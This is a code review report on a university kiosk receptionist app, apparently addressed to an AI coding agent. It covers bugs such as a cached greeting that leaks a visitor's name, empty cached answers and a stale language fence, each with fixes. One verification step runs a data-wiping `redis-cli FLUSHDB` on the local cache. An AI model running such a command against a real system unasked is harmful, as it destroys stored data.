# Code Review Findings — branch `admin-dashboard-and-white-labeling`

**Review date:** 2026-09-04
**Base branch compared against:** `origin/haici-agent-updated`
**Diff size reviewed:** 161 files, 54,334 insertions, 1,744 deletions
**Repository root:** `C:\Users\USER\Desktop\haici-agent`
**Findings:** 15 primary + 7 secondary + 2 systemic rule violations

---

## 0. How to use this document

You are being handed this document to **fix the issues described below**. Read this
section completely before touching any file.

### 0.1 What each finding contains

Every finding has the same seven parts. Do not skip any of them:

| Part | What it is | How to use it |
|---|---|---|
| **ID** | A stable identifier like `F-01` | Quote it in your commit message |
| **Severity** | HIGH / MEDIUM / LOW | Fix HIGH first |
| **Location** | `path/to/file.ts:LINE` | The exact line to open |
| **Current code** | The code as it exists today, copied verbatim | Use it to confirm you are looking at the right place. If it does not match, STOP and re-read the file — line numbers may have shifted since this report was written |
| **Why it is wrong** | The mechanism of the bug | Read this before writing the fix |
| **Failure scenario** | Concrete inputs to concrete wrong output | This is your test case |
| **The fix** | Exact replacement code | Apply it, but read §0.4 first |
| **How to verify** | The check that proves it worked | Run this before declaring done |

### 0.2 Absolute rules for this repository

These override any habit you have. Violating them will break the developer's machine
or the build.

1. **NEVER run npm, node, bun, npx, yarn, or pnpm on the host machine.** There is no
   Node installation on the host. All JavaScript and TypeScript work goes through
   Docker:
   - Install a dependency: edit `web/package.json`, then `docker compose build web`
   - Run a one-off command: `docker compose run --rm web bun <cmd>`
   - Start everything: `docker compose up -d`
2. **NEVER open `http://localhost:5173`.** The kiosk is HTTPS-only (`VITE_HTTPS=1` in
   `.env` makes Vite run the `basicSsl` plugin). Plain HTTP returns
   `ERR_EMPTY_RESPONSE` with no error page, because the TLS listener receives
   plaintext and closes the socket. Use **`https://localhost:5173/`** and
   **`https://localhost:5173/#/admin`**. Accept the self-signed certificate warning
   once per device.
3. **Never hand-edit `web/public/mascot/` or `web/src/lib/mascotRig.ts`.** They are
   build output from `tools/build_mascot_assets.py`. Change the script and rerun it.
4. **Never write a raw hex colour, `bg-white`, or `text-black` in a component.** The
   app is white-labelled at runtime; raw colours ignore the tenant's theme. Use the
   semantic Tailwind names: `bg-brand-600`, `text-neutral-500`, `bg-surface`,
   `text-on-brand`, `text-warn-700`. The only two exceptions are (a) `Mascot2D.tsx`,
   which is supplied artwork like a logo, and (b) Recharts, which needs computed
   values via `chartColors()` in `web/src/components/admin/ui.tsx` because `var()`
   does not resolve inside SVG attributes.
5. **Never add `transition: all` or the Tailwind `transition-all` utility.** Chrome
   does not re-resolve a transitioning property when the CSS custom property behind it
   changes, so elements get stuck showing the previous tenant's colours. Enumerate the
   specific properties instead (`transition-colors`, `transition-opacity`, or an
   explicit `transition-[background-color,border-color]`).
6. **Preserve everything in `shared_docs/`.** It is workflow input data about the
   Islamic University of Lebanon, not scratch space.
7. **Do not delete `n8n_local_data/`.** It holds n8n's SQLite database with every
   workflow and credential.

### 0.3 Important caveat about the n8n workflow JSON files

The `.json` workflow files in the repository root (`Agent Workflow.json`,
`admin_dashboard_workflow.json`, `STT Webhook.json`, `RAG workflow.json`) are
**exports**, not the running system. The live workflows inside the n8n container are
the actual source of truth and have drifted ahead of these files.

This matters for findings **F-01 through F-04**:

- The bug may or may not still be present in the live n8n instance.
- **You must check both.** Read the live workflow through the n8n REST API
  (`http://localhost:5678/api/v1/workflows`) before concluding a workflow bug is
  fixed, and re-export afterwards with `python tools/export_workflows.py` so the
  committed file matches reality.
- Fixing only the committed JSON fixes nothing at runtime. Fixing only the live
  workflow means the next person who imports the repo re-introduces the bug.

### 0.4 Rules for applying fixes

- **One finding per commit.** Reference the finding ID (`F-07`) in the message.
- **Do not "improve" code you were not asked to touch.** Every unrelated change makes
  review of your fix harder.
- **If the current code does not match what this report quotes**, stop and report that
  instead of guessing. The file has changed since the review.
- **If a fix requires a decision this report does not make** (for example, choosing a
  shared-secret mechanism for the WebSocket in F-08), implement the simplest correct
  option and write a comment above it saying what you chose and why.
- **Add a regression test where the repo has a place for one.** Where it does not,
  write the manual reproduction steps into the commit message.

---

## 1. Project context primer

Read this if you have not worked in this repository before. Skip to §2 if you have.

### 1.1 What the system is

A self-hosted **kiosk receptionist** for the Islamic University of Lebanon (IUL). A
visitor walks up to a tablet, either types a question or speaks it, and an AI agent
answers using university documents. The same codebase is sold to other businesses, so
every visual detail is runtime configuration rather than source code.

### 1.2 The services (from `docker-compose.yml`)

| Service | Role | Host port |
|---|---|---|
| `n8n` | The orchestrator. All the business logic lives in its workflows | 5678 |
| `web` | Vite + React 18 + TypeScript + Tailwind kiosk UI, plus a Bun sidecar server | 5173 (HTTPS), 3001 (WebSocket) |
| `qdrant` | Vector store — document embeddings and the Tier-2 semantic answer cache | 6333 |
| `postgres` | `receptionist_session_logs` and `admin_settings` tables | 5432 (loopback) |
| `redis` | Tier-1 exact-match answer cache | 6379 (loopback) |
| `whisper` | Local speech-to-text. **Runs but serves no traffic** — dead weight | 8000 |

Inside Docker the services address each other **by container name**, not by host port:
`http://qdrant:6333`, `postgres:5432`, `redis:6379`, `http://n8n:5678`.

### 1.3 Inference is NOT local

Despite the `whisper` container existing, all AI work is remote:

| What | Provider | Endpoint |
|---|---|---|
| Speech-to-text | **Groq** | `api.groq.com/openai/v1/audio/transcriptions`, model `whisper-large-v3-turbo` |
| Agent LLM | **Google Gemini** | `generativelanguage.googleapis.com` … `gemini-2.5-flash` |
| Semantic-cache judge | **Google Gemini** | … `gemini-2.5-flash` |
| Embeddings | **Google Gemini** | … `gemini-embedding-001` |
| Text-to-speech | **Google Gemini** | … `gemini-2.5-flash-preview-tts` |

Audio and question text leave the machine. That is why the privacy finding (F-01)
matters.

### 1.4 How a turn flows

**Text turn:** browser sends `POST application/json` to `/webhook/rag-agent` with
`{ sessionId, text, wantsAudio }`.

**Voice turn:** browser sends `POST multipart/form-data` to `/webhook/stt` with
`file`, `sessionId`, `wantsAudio`. That separate STT workflow transcribes via Groq and
returns `{ text, language, error }`. The transcript is then sent as a text turn.

**Response (both):** JSON `{ answer, question?, audioBase64?, audioMime? }`.

The browser talks **only** to the n8n webhook. It never calls Groq or Gemini directly.
CORS is avoided entirely by a Vite reverse proxy: `web/vite.config.ts` proxies
`/webhook/*` to `http://n8n:5678/webhook/*` and `/api/*` to the Bun sidecar, so every
browser request is same-origin.

### 1.5 The two-tier answer cache

1. **Tier 1 (Redis):** exact match on a hash of the normalised question. Sub-second.
2. **Tier 2 (Qdrant):** semantic match. The question is embedded, the nearest stored
   question is retrieved, and a Gemini "judge" decides whether they are the same
   question. If yes, the stored answer is reused.

Both tiers are supposed to be fenced by language (`|lang:` in the key plus a Qdrant
payload filter) so an Arabic answer is never served to an English question. **F-04 is
that the committed export does not have this fence at all.**

Both tiers are supposed to be fenced by visitor identity for personal questions
("who am I?") so one visitor's name is never replayed to another. **F-01 is a hole in
that fence.**

### 1.6 Frontend architecture

- **`web/src/hooks/useChat.ts` is the single source of truth for chat state.** It owns
  the sessions array (persisted to `localStorage`), the active session id, the pending
  flag, the toast, and the retriable set. It holds **one** in-flight
  `AbortController` — sending a new message cancels the previous one. It is the only
  place `dispatch()` lives.
- **`web/src/App.tsx`** resolves a single `FaceState` (`idle | listening | thinking |
  speaking`) from the union of the TTS / STT / pending booleans, plus an `amplitude`
  in 0..1. When TTS is on, amplitude comes from a WebAudio `AnalyserNode` tapping the
  playback element. When TTS is off, `App.tsx` synthesises an envelope from the
  reply's character count so the mouth still moves.
- **The avatar** has four renderers chosen by `avatar.kind` in the branding config:
  `mascot` (`web/src/components/Mascot2D.tsx`, the supplied HAICI character — what IUL
  runs), `glb` (`web/src/components/Avatar3D.tsx`), `image`, `none`. All four take the
  same `(state, amplitude, emotion)` triple. `FaceState` and `Emotion` live in
  `web/src/types.ts`.
- **White-labelling:** one tenant document at `branding/branding.json`, bind-mounted to
  `/app/branding` in the `web` container. It covers identity, theme colours, avatar
  choice, feature switches, and brand-bound copy. It is edited from `#/admin` →
  Branding tab and served by the Bun sidecar (`web/ws-server.ts`) at
  `GET/PUT /api/branding`.
- **Theming works by redefining Tailwind's scales.** `web/tailwind.config.js` points
  `teal`→brand, `slate`→neutral, `amber`→warn at CSS custom properties, and
  `web/src/lib/branding/theme.ts` writes those properties from the config. An existing
  `bg-teal-600` therefore retargets itself with no rebuild. Full 11-stop ramps are
  generated from a single hex by `web/src/lib/branding/color.ts`, and dark mode is the
  neutral ramp inverted — which is why no `dark:` variants exist anywhere.
- **Config resolves before the first React render** (`web/src/main.tsx`), so components
  read it synchronously via `useTenant()`. There is no loading state. This is why F-06
  and F-07 produce a blank page rather than a degraded one.
- **Browser storage keys are tenant-scoped** through `web/src/lib/branding/scope.ts`,
  so two tenants can share an origin without reading each other's conversations.

---

## 2. Findings index

Fix in this order. Findings within a group are independent of each other unless the
"Depends on" column says otherwise.

| ID | Sev | File | Line | One-line summary | Depends on |
|---|---|---|---|---|---|
| F-01 | HIGH | `Agent Workflow.json` | 1312 | Personalised greeting cached under a shared key, replayed to the next visitor | — |
| F-02 | HIGH | `Agent Workflow.json` | 403 | Fan-in picks `Detect Greeting` over `Parse Cached Response`, returning an empty answer | — |
| F-03 | HIGH | `Agent Workflow.json` | 449 | TTS failure branch discards the answer that was already generated | — |
| F-04 | HIGH | `Agent Workflow.json` | 60 | Committed export predates the language fence; importing it re-introduces cross-language reuse | — |
| F-05 | HIGH | `web/src/App.tsx` | 207 | Opening greeting is posted into the previous session | — |
| F-06 | HIGH | `web/src/main.tsx` | 67 | Unhandled bootstrap rejection leaves a permanently blank page | F-07 |
| F-07 | HIGH | `web/src/lib/branding/defaults.ts` | 68 | A scalar supplied for a sub-object key wipes the entire defaulted branch | — |
| F-08 | HIGH | `web/ws-server.ts` | 235 | Unauthenticated WebSocket relay published on all network interfaces | — |
| F-09 | MED | `web/src/hooks/usePresence.ts` | 202 | Cooldown never refreshed, so a standing visitor is re-woken and their conversation wiped | — |
| F-10 | MED | `web/src/hooks/useSTT.ts` | 220 | A throwing `rec.stop()` skips microphone teardown; UI stuck in "recording" | — |
| F-11 | MED | `web/src/hooks/useVision.ts` | 215 | `{once:true}` gesture listener never re-armed after a failed camera start | — |
| F-12 | MED | `web/src/lib/storage.ts` | 23 | Unguarded `setItem` crashes the whole kiosk into the ErrorBoundary | — |
| F-13 | MED | `web/src/components/admin/LexiconEditor.tsx` | 323 | Save response overwrites edits made while the request was in flight | — |
| F-14 | MED | `web/ws-server.ts` | 140 | Non-atomic write can truncate `branding.json` and 500 every future read | — |
| F-15 | MED | `web/src/lib/branding/theme.ts` | 57 | Global transition freeze is orphaned if `paintTheme` throws | — |
| S-01 | MED | `web/src/lib/adminFormat.ts` | 85 | CSV formula injection from visitor-typed question text | — |
| S-02 | MED | `web/src/lib/branding/color.ts` | 154 | `readableOn` threshold is 0.45 instead of ~0.179, giving 2:1 contrast | — |
| S-03 | MED | `web/src/components/Avatar3D.tsx` | 160 | GLB models stack on `modelUrl` change and are never disposed | — |
| S-04 | MED | `web/src/components/Avatar3D.tsx` | 164 | GLB load failure gives a permanently blank canvas with no fallback | S-03 |
| S-05 | MED | `face_detect.py` | 88 | Haar cascade loaded from a hardcoded absolute Windows path | — |
| S-06 | MED | `Hardware/src/main.cpp` | 409 | `lastPresenceMs = 0` suppresses presence detection for 3 minutes after boot | — |
| S-07 | LOW | `web/src/components/admin/LexiconEditor.tsx` | 244 | `aliasDrafts` keyed by index survives a splice and writes onto the wrong term | — |
| R-01 | — | `web/src/index.css` | 143, 157, 161 | `transition-all` on `.btn`, `.btn-icon`, `.input` violates the theming rule | F-15 |
| R-02 | — | `web/src/components/admin/UsageHeatmap.tsx` | 14, 18 | Hardcoded teal/slate `rgba()` ignores the tenant theme | — |

---

# 3. Primary findings

---

## F-01 — Personalised greeting is cached under a shared key and replayed to the next visitor

- **Severity:** HIGH (privacy)
- **Location:** `Agent Workflow.json:1312` (node `Detect Greeting`), interacting with
  `Agent Workflow.json:60` (node `Normalize & Hash Question`)
- **Category:** privacy / cache poisoning

### Current behaviour

`Normalize & Hash Question` decides whether a question gets a private, per-visitor
cache key. It does so with a regex called `PERSONAL`:

```js
const PERSONAL = /(who am i|who i am|what'?s my name|what is my name|my name|do you know me|know who i am|recogni[sz]e me|remember me|who do you think i am|what do you know about me|have we met|who do you see|من انا|من أنا|ما اسمي|شو اسمي|اسمي|تعرفني|هل تعرفني|بتعرفني|تتذكرني|هل تتذكرني|بتتذكرني|تعرف عني|شو بتعرف عني)/;

const keyBase = personal && visitorName
  ? normalized + '|visitor:' + visitorName.toLowerCase()
  : normalized;

item.json.questionHash = simpleHash(keyBase);
```

Separately, `Detect Greeting` (line 1312) answers greetings inline, without the agent,
and **puts the visitor's name into the answer**:

```js
let visitorName = '';
try {
  visitorName = String($('Normalize & Hash Question').first().json.visitorName || '').trim();
} catch (e) { visitorName = ''; }

const arabic = /[\u0600-\u06FF]/.test(raw);
const who = visitorName ? ' ' + visitorName : '';
const answer = arabic
  ? 'أهلاً' + who + '! كيف يمكنني مساعدتك؟'
  : 'Hello' + who + '! How can I help you today?';
```

### Why it is wrong

The word "hello" does not match the `PERSONAL` regex. Therefore `keyBase` is just
`"hello"` — the **shared** key. But the answer built from that key contains a specific
person's name.

The workflow's own comment in `Normalize & Hash Question` says the risk is understood
and claims it is handled:

> "greetings are answered before the agent runs (see Detect Greeting), and the agent is
> instructed to use the name only for identity questions."

That reasoning covers the *agent's* answers. It does not cover the greeting node
itself, which is the one node that both (a) injects the name and (b) is not covered by
the `PERSONAL` key fence.

### Proof that the greeting reaches the cache

I traced the `connections` graph of `Agent Workflow.json`. Both greeting paths end in a
cache write:

```
Detect Greeting
  -> IF (Greeting?)
       [output 0 = is a greeting]
         -> IF (needs TTS?)
              [output 0] -> Split Answer Into Chunks -> Gemini TTS
                            -> Build JSON (Text + Audio)
                               -> Save Audio to Cache        <-- WRITES
              [output 1] -> IF (wantsAudio?)
                            [output 1] -> Save to Redis Cache <-- WRITES
```

There is no branch on which a greeting is answered and *not* cached.

### Failure scenario (this is your test case)

1. The camera recognises a visitor. The kiosk POSTs:
   `{"sessionId":"s1","text":"hello","wantsAudio":true,"visitor":{"name":"Mariam Badawi"}}`
2. `Normalize & Hash Question` computes `keyBase = "hello"` because
   `PERSONAL.test("hello")` is `false`. `questionHash = simpleHash("hello")`.
3. `Detect Greeting` produces `"Hello Mariam Badawi! How can I help you today?"`.
4. `Save to Redis Cache` (or `Save Audio to Cache`) writes that string — and, on the
   audio path, a WAV of a voice **speaking that name** — under `simpleHash("hello")`
   with a 30-day TTL.
5. A different, unrecognised person walks up and types `hello`.
6. Tier-1 cache hits. They are greeted as "Mariam Badawi", in text and in speech.

### Why the existing privacy test does not catch this

`tools/visitor-privacy-test/leak_suite.py` only sends questions from its `ORDINARY` and
personal-question sets. It never sends a **greeting** with a `visitor` object attached,
so this path is untested and the suite passes.

### The fix

Two changes are required; do **both**.

**(a) Never cache a greeting.** This is the cleanest fix, because a greeting is
sub-second to generate anyway — caching it buys nothing. In `Detect Greeting`, mark the
item, and add that flag to the condition on the `IF` nodes that feed the two cache-write
nodes:

```js
item.json.isGreeting  = true;
item.json.answer      = answer;
item.json.question    = raw;
item.json.wantsAudio  = wantsAudio;
item.json.matchType   = 'greeting';
item.json.audioBase64 = '';
item.json.audioMime   = '';
item.json.noCache     = true;   // <-- ADD: greetings are never cacheable
out.push(item);
```

Then gate both cache writes. The simplest way in n8n is to insert an `IF` node
immediately before `Save to Redis Cache` and before `Save Audio to Cache` whose
condition is:

```
{{ $json.noCache !== true }}
```

and wire only the `true` output onward.

**(b) Make the key fence cover names regardless of the regex.** Defence in depth: if a
name ever reaches an answer again through some other path, the key must reflect it. In
`Normalize & Hash Question`, change the key derivation so the presence of a
`visitorName` scopes the key whenever the *answer* could carry it:

```js
// A greeting is personalised by Detect Greeting whether or not it matches
// PERSONAL, so any turn that HAS a visitor name and could be greeted must not
// share a key with an anonymous turn.
const couldCarryName = personal || isLikelyGreeting(normalized);
const keyBase = couldCarryName && visitorName
  ? normalized + '|visitor:' + visitorName.toLowerCase()
  : normalized;
```

You will need a small `isLikelyGreeting` helper in that node mirroring the `GREET`
regex from `Detect Greeting`. Duplicating the regex is acceptable here — n8n Code nodes
cannot import shared modules — but add a comment in **both** nodes saying they must be
kept in sync.

**(c) Extend the test.** In `tools/visitor-privacy-test/leak_suite.py`, add a case that
sends `hello` with `visitor.name` set, then sends `hello` with no visitor, and asserts
the second response does **not** contain the first visitor's name.

### How to verify

```bash
docker compose exec redis redis-cli --scan --pattern 'answer:*'
```

Send a greeting with a visitor name, then check that no new key appeared (fix a), or
that the key that appeared contains `visitor:` (fix b). Then send `hello` anonymously
and confirm the reply is `"Hello! How can I help you today?"` with no name.

---

## F-02 — Fan-in probes `Detect Greeting` before `Parse Cached Response`, returning an empty answer

- **Severity:** HIGH (correctness + cache poisoning)
- **Location:** `Agent Workflow.json:403` (node `Build JSON (Text + Audio)`, inside
  `jsCode`)
- **Category:** correctness

### Current behaviour

```js
function pickSource(name) {
  try {
    return $(name).isExecuted ? $(name).first().json : null;
  } catch (e) {
    return null;
  }
}
const source = pickSource('Keep Answer Text')
  || pickSource('Build Clarification Reply')
  || pickSource('Detect Greeting')
  || pickSource('Parse Cached Response')
  || {};
const answer   = source.answer   || '';
const question = source.question || '';
```

### Why it is wrong

`pickSource` returns the node's JSON when the node **executed**, regardless of whether
that node produced an `answer` field. `Detect Greeting` executes on **every**
non-exact-cache-hit turn: for a non-greeting it takes the pass-through path and sets
only `item.json.isGreeting = false`, leaving no `answer`:

```js
if (!isGreeting) {
  // Pass through untouched so the normal path sees exactly what it did before.
  item.json.isGreeting = false;
  out.push(item);
  continue;
}
```

So `pickSource('Detect Greeting')` returns a **truthy object with no `answer`**. The
`||` chain stops there and never reaches `Parse Cached Response`, which is the node
that actually holds the cached answer. `source.answer || ''` then evaluates to `""`.

This is a known bug class in this repository: an always-executing node poisoning a
`||` fan-in chain. Check the rest of the workflow for the same pattern.

### Failure scenario (this is your test case)

1. Visitor A asks *"What are the tuition fees?"* with `wantsAudio: false`. The answer
   is generated and cached with `audioBase64: ''`.
2. Visitor B asks the paraphrase *"How much is tuition?"* with `wantsAudio: true`.
3. Execution path:
   `Correct Domain Terms` → `Detect Greeting` (executes, `isGreeting:false`, no
   `answer`) → … → `Fetch Semantic Hit` → `Parse Cached Response` →
   `IF (needs TTS?)` = true → `Split Answer Into Chunks` → `Gemini TTS` →
   `Build JSON (Text + Audio)`.
4. In `Build JSON`: `Keep Answer Text` did not execute (cache hit, no agent run) →
   null. `Build Clarification Reply` did not execute → null.
   `Detect Greeting` **did** execute → truthy object → chain stops.
5. `answer = ''`, `question = ''`.
6. The browser receives
   `{ answer: "", question: "", audioMime: "audio/wav", audioBase64: "<real speech>" }`.
   The visitor sees a **blank chat bubble while the correct answer is spoken aloud**.
7. `Build JSON` then feeds `Save Audio to Cache`, which writes `answer: ""` back under
   the current question's hash with a 30-day TTL. **The cache is now poisoned** — every
   future asker of that question gets a blank bubble too.

### The fix

Order the chain by specificity, and require an actual answer rather than mere
execution. Replace the `pickSource` block with:

```js
// Return the node's JSON only if it BOTH executed and produced a non-empty
// answer. `Detect Greeting` runs on every non-cache-hit turn and emits no
// answer on the pass-through path, so probing execution alone silently
// selects it over the node that really holds the answer.
function pickSource(name) {
  try {
    if (!$(name).isExecuted) return null;
    const j = $(name).first().json;
    return (j && typeof j.answer === 'string' && j.answer.trim() !== '') ? j : null;
  } catch (e) {
    return null;
  }
}
const source = pickSource('Keep Answer Text')
  || pickSource('Parse Cached Response')
  || pickSource('Build Clarification Reply')
  || pickSource('Detect Greeting')
  || {};
```

Note both changes: the emptiness check **and** moving `Parse Cached Response` up.
Either alone fixes this specific case; both together make the node robust to the next
branch someone adds.

**Also add a guard on the cache write.** An empty answer must never be persisted. On
the `Save Audio to Cache` and `Save to Redis Cache` paths, add an `IF` with condition:

```
{{ ($json.answer || '').trim().length > 0 }}
```

### How to verify

1. Clear the caches: `docker compose exec redis redis-cli FLUSHDB`
2. Ask "What are the tuition fees?" with audio **off**. Confirm you get a text answer.
3. Ask "How much is tuition?" with audio **on**.
4. **Expected:** the answer text appears in the bubble *and* is spoken.
   **Bug present:** the bubble is empty but speech plays.

---

## F-03 — TTS failure branch discards the answer that was already generated

- **Severity:** HIGH (data loss)
- **Location:** `Agent Workflow.json:449` (node `Respond (Text Only)`, `responseBody`),
  caused by the error wiring at `Agent Workflow.json:399` (node `Gemini TTS`)
- **Category:** data loss / error handling

### Current behaviour

`Gemini TTS` is configured with:

```json
"onError": "continueErrorOutput",
"retryOnFail": true
```

Its two outputs are wired as:

```
Gemini TTS
  [output 0 = success] -> Build JSON (Text + Audio)
  [output 1 = error  ] -> Respond (Text Only)
```

`Respond (Text Only)` has:

```json
"responseBody": "={{ { \"answer\": $json.answer, \"question\": $json.question } }}"
```

### Why it is wrong

The items flowing into `Gemini TTS` come from `Split Answer Into Chunks`, which emits:

```js
return [{ json: { chunkIndex: 0, text: answer, totalChunks: 1 } }];
```

There is **no `answer` field** on those items — the answer text lives in `text`. When
n8n routes an item to the error output it forwards that same item with an `error` key
added. So on the error branch, `$json.answer` is `undefined` and `$json.question` is
`undefined`.

The answer itself was fully computed upstream and is sitting in `Keep Answer Text`. It
is simply never read.

### Failure scenario (this is your test case)

1. A visitor asks a question with `wantsAudio: true`.
2. The agent generates a correct 400-character answer. `Keep Answer Text` holds it.
3. `Gemini TTS` returns HTTP 429 (Gemini free-tier rate limit) and `retryOnFail`
   exhausts its attempts.
4. Output 0 is empty, so `Build JSON (Text + Audio)` never runs.
5. Output 1 carries `{ chunkIndex: 0, text: "...", totalChunks: 1, error: "..." }`.
6. `Respond (Text Only)` evaluates `{ answer: undefined, question: undefined }` and
   n8n serialises that to `{}`.
7. The browser receives `{}`. The visitor sees an **empty reply and no error message**.
8. `Save to Redis Cache` is not on this branch either, so the turn is not cached — the
   next identical question pays the full generation cost again.

### The fix

Read the answer from the node that actually has it, and fall back through the same
sources `Build JSON` uses. Change `Respond (Text Only)`'s `responseBody` to:

```
={{ {
  "answer": $('Keep Answer Text').isExecuted
              ? $('Keep Answer Text').first().json.answer
              : ($('Parse Cached Response').isExecuted
                  ? $('Parse Cached Response').first().json.answer
                  : ($json.text || '')),
  "question": $('Normalize & Hash Question').isExecuted
              ? $('Normalize & Hash Question').first().json.userText
              : ''
} }}
```

If that expression is unwieldy in the n8n UI, the cleaner alternative is to insert a
small Code node named `Recover Answer After TTS Failure` between `Gemini TTS`'s error
output and `Respond (Text Only)`:

```js
// TTS failed. The answer itself is fine — it lives upstream. Recover it so a
// voice-synthesis failure degrades to a text reply instead of an empty one.
function pick(name) {
  try {
    if (!$(name).isExecuted) return null;
    const j = $(name).first().json;
    return (j && typeof j.answer === 'string' && j.answer.trim() !== '') ? j : null;
  } catch (e) { return null; }
}
const src = pick('Keep Answer Text') || pick('Parse Cached Response') || {};
return [{
  json: {
    answer: src.answer || '',
    question: src.question || '',
    ttsFailed: true,
  }
}];
```

Then wire `Gemini TTS`[1] → `Recover Answer After TTS Failure` → `Respond (Text Only)`.

**Also fix the missing cache write.** Wire the recovery node to `Save to Redis Cache`
as well (with `audioBase64: ''`), so a TTS outage does not also disable caching.

### How to verify

Temporarily break TTS — set the `Gemini TTS` node's URL to an invalid host, or revoke
the API key — then ask a question with audio on. **Expected:** the text answer appears
with no audio. **Bug present:** an empty bubble.

---

## F-04 — Committed workflow export predates the language fence

- **Severity:** HIGH (correctness, and it disables a safety tool)
- **Location:** `Agent Workflow.json:60` and three other nodes in the same file
- **Category:** stale artifact

### Current behaviour

Commit `4dd06a7` — *"cache: fence answer reuse by language, in the key and in the
semantic tier"* — touched only `docs/SYSTEM-CHANGES.md` and
`tools/visitor-privacy-test/cache_key_audit.py`. It did **not** update
`Agent Workflow.json`. The last commit that touched that file is `f68ab20`
(2026-09-01), which predates the fix.

Verification, run from the repo root:

```bash
grep -c "lang:" "Agent Workflow.json"     # returns 0
git log --oneline -- "Agent Workflow.json" | head -3
```

Four specific things are missing from the export:

1. **`Normalize & Hash Question` (line 60)** — `keyBase` has no `|lang:` suffix:
   ```js
   const keyBase = personal && visitorName
     ? normalized + '|visitor:' + visitorName.toLowerCase()
     : normalized;
   ```
   There is no language component at all.
2. **`Index Question Vector`** — writes no `language` field into the Qdrant point
   payload, so there is nothing to filter on later.
3. **`Semantic Lookup`** — the Qdrant search request body contains no `filter` clause.
4. **`Judge Same Question`** — the prompt still contains the instruction that
   *"differences in … language (English vs Arabic) do NOT make them different"*, which
   actively tells the judge to conflate languages.

### Why it is wrong

Gemini's `gemini-embedding-001` is multilingual: the vector for the Arabic
*"ما هو HAICI؟"* sits very close to the vector for the English *"what is HAICI"*. The
semantic tier will retrieve it, the judge is instructed to call it the same question,
and the Arabic answer is served to an English speaker — then written back under the
English key for 30 days.

### Failure scenario (this is your test case)

1. Import this `Agent Workflow.json` into a clean n8n instance and activate it.
2. Ask, in Arabic: *"ما هو HAICI؟"*. The answer is generated in Arabic and indexed.
3. Ask, in English: *"tell me about haci"* (note the deliberate typo, which routes it
   past the exact-match tier into the semantic tier).
4. **Expected:** an English answer. **Bug present:** the Arabic answer is returned to
   an English question, and is then cached under the English key.

### Secondary effect — the audit tool is silently disabled

`tools/visitor-privacy-test/cache_key_audit.py` was updated by `4dd06a7` and now
recomputes cache keys **with** the `|lang:` component. Run against a workflow that
builds keys **without** it, every stored key fails to match any recomputed key, so
every entry classifies as `UNVERIFIED` and the script **exits 0 vacuously**. It reports
success while checking nothing — which is also why it cannot detect F-01.

### The fix

This is the finding where §0.3 matters most. Follow this sequence:

1. **Read the live workflow first:**
   ```bash
   curl -s -H "X-N8N-API-KEY: $N8N_API_KEY" http://localhost:5678/api/v1/workflows | python -m json.tool
   ```
   Find the workflow named `Agent Workflow`, fetch it by id, and check whether its
   `Normalize & Hash Question` node contains `|lang:`.
2. **If the live workflow already has the fence:** the live system is fine; the export
   is merely stale. Re-export and commit:
   ```bash
   python tools/export_workflows.py
   git add "Agent Workflow.json" && git commit -m "F-04: re-export Agent Workflow so the committed JSON matches the live language fence"
   ```
3. **If the live workflow does NOT have the fence:** apply all four changes below to
   the live workflow through the n8n UI, then re-export.

**Change 1 — `Normalize & Hash Question`:** detect the language and put it in the key.

```js
// Arabic script anywhere in the question marks the turn as Arabic. The cache
// key must carry it: the embedding model is multilingual, so without this an
// Arabic answer is reachable from an English question and vice versa.
const language = /[\u0600-\u06FF]/.test(raw) ? 'ar' : 'en';

const keyBase = (personal && visitorName
  ? normalized + '|visitor:' + visitorName.toLowerCase()
  : normalized) + '|lang:' + language;

item.json.language = language;
item.json.questionHash = simpleHash(keyBase);
```

**Change 2 — `Index Question Vector`:** add `language` to the Qdrant point payload, so
stored vectors carry the language they were written in.

```json
"payload": {
  "question": "={{ $json.normalizedQuestion }}",
  "answer": "={{ $json.answer }}",
  "language": "={{ $json.language }}"
}
```

**Change 3 — `Semantic Lookup`:** filter the Qdrant search by that payload field.

```json
"filter": {
  "must": [
    { "key": "language", "match": { "value": "={{ $json.language }}" } }
  ]
}
```

**Change 4 — `Judge Same Question`:** remove the instruction that language differences
do not matter, and replace it with the opposite:

> Two questions asked in different languages are NEVER the same question. If one is in
> Arabic and the other in English, answer DIFFERENT.

**Why all four are needed:** the key alone is not sufficient. The key fences Tier 1
(Redis exact match). Tier 2 (Qdrant semantic match) does not use the key at all — it
uses vector proximity — so it needs its own payload filter, and the judge needs to stop
being told to ignore language.

### How to verify

After fixing, run the audit and confirm it reports actual verified entries rather than
all-`UNVERIFIED`:

```bash
python tools/visitor-privacy-test/cache_key_audit.py
```

Then run the Arabic-then-English reproduction from the failure scenario above.

---

## F-05 — Opening greeting is posted into the previous session

- **Severity:** HIGH (correctness, user-visible on every kiosk wake)
- **Location:** `web/src/App.tsx:207`
- **Category:** stale closure

### Current code

`web/src/App.tsx:199-210`:

```tsx
const startConversation = useCallback(
  (name: string | null) => {
    chat.createSession();
    setView("chat");
    // The name comes from a face match, which can be wrong. It is phrased as
    // the visitor introducing themselves rather than as an assertion the
    // kiosk makes about them, so a mismatch reads as a misunderstanding the
    // person can correct, not as the machine insisting who they are.
    const greeting = name ? `Hello! I'm ${name}.` : "Hello!";
    setTimeout(() => chat.sendText(greeting), 120);
  },
  [chat],
);
```

The relevant part of `web/src/hooks/useChat.ts:324-331`:

```ts
const ensureActive = useCallback((): string => {
  if (activeId && sessions.find((s) => s.id === activeId)) return activeId;
  if (sessions[0]) {
    setActiveIdState(sessions[0].id);
    return sessions[0].id;
  }
  return createSession().id;
}, [activeId, sessions, createSession]);
```

And `createSession` returns the session it made (`useChat.ts:105`):

```ts
const createSession = useCallback((title = "New chat"): Session => { … });
```

### Why it is wrong

`chat.createSession()` is called and its **return value is discarded**. The new session
id is therefore never captured.

The `setTimeout` callback closes over `chat` — the object from the render in which
`startConversation` was created. `chat.sendText` is a `useCallback` whose dependency
chain includes `ensureActive`, which closes over `activeId` and `sessions` **as they
were at that render**, i.e. *before* `createSession` ran.

So 120 ms later, `ensureActive()` executes `if (activeId && sessions.find(...)) return
activeId` against the **old** `activeId` and the **old** `sessions` array — both of
which still describe the previous session. It returns the old id.

React state updates do not mutate the captured `chat` object; a new one is produced on
the next render, but the already-scheduled `setTimeout` holds the old one.

### Failure scenario (this is your test case)

1. The kiosk has been running and has one existing session `s0`. `activeId === "s0"`.
2. A visitor taps "Begin Conversation".
3. `presence` fires `onWake` → `startConversation(null)`.
4. `chat.createSession()` creates `s1` and sets `activeId = "s1"`. `setView("chat")`
   switches the UI to the chat panel, which renders **`s1`** (empty).
5. 120 ms later the stale `chat.sendText("Hello!")` runs. `ensureActive()` returns
   `"s0"`.
